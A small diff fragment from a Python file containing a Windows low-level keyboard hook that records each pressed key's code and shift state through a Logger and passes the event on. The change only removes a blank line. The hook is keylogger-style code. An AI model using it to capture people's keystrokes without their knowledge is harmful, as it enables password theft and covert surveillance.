@@ -95,7 +95,6 @@ def LowLevelKeyboardProc(nCode, wParam, lParam):
         shifted = any([windll.user32.GetAsyncKeyState(x) & 0x8000 for x in VK_SHIFT])
         capslocked = windll.user32.GetAsyncKeyState(VK_CAPS_LOCK) & 0x8000
         vkCode = lParam.contents.vkCode
-        
         Logger.Log(vkCode, shifted or capslocked)
 
     return windll.user32.CallNextHookEx(hook, nCode, wParam, lParam)
